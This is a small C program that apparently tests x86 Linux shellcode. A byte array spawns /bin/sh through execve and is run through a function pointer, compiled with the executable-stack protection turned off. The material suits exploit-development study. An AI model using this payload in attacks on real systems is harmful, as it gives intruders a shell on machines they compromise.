// gcc test.c -z execstack

char sc[] =
"\x31\xc0"
"\x50"
"\x68\x6e\x2f\x73\x68"
"\x68\x2f\x2f\x62\x69"
"\x89\xe3"
"\x50"
"\x53"
"\x89\xe1"
"\xb0\x0b"
"\xcd\x80"
;
int main()
{
    void (*fp)(void) = (void (*)(void))sc;

    printf("Length: %d\n",strlen(sc));
    fp();
}
